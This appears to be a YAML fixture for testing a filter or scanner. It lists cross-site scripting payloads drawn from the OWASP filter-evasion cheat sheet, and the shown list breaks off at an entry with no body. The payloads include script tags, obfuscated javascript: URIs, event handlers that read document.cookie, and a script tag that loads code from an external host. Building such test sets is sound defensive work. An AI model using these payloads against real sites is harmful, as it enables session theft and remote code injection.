  # --- OWASP XSS filter evasion cheat sheet ----------------------------------------------------
  - name: xss script tag
    body: '<script>alert(''XSS'')</script>'
  - name: xss script src
    body: '<SCRIPT SRC=https://cdn.jsdelivr.net/gh/Moksh45/host-xss.rocks/index.js></SCRIPT>'
  - name: xss polyglot
    body: "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(42);//'>"
  - name: xss img javascript
    body: '<IMG SRC="javascript:alert(''XSS'');">'
  - name: xss img no quotes
    body: '<IMG SRC=javascript:alert(''XSS'')>'
  - name: xss img case
    body: '<IMG SRC=JaVaScRiPt:alert(''XSS'')>'
  - name: xss html entities
    body: '<IMG SRC=javascript:alert(&quot;XSS&quot;)>'
  - name: xss grave accent
    body: '<IMG SRC=`javascript:alert("RSnake says, ''XSS''")`>'
  - name: xss malformed a
    body: '<a onmouseover="alert(document.cookie)">xxs link</a>'
  - name: xss malformed a no quotes
    body: '<a onmouseover=alert(document.cookie)>xxs link</a>'
  - name: xss malformed img
    body: '<IMG """><SCRIPT>alert("XSS")</SCRIPT>"\>'
  - name: xss fromcharcode
    body: '<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>'
  - name: xss default src
    body: '<IMG SRC=# onmouseover="alert(''xxs'')">'
  - name: xss onerror
    body: '<IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img>'
  - name: xss decimal entities
    body: '<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;">Click Me!</a>'
  - name: xss decimal entities no semicolon
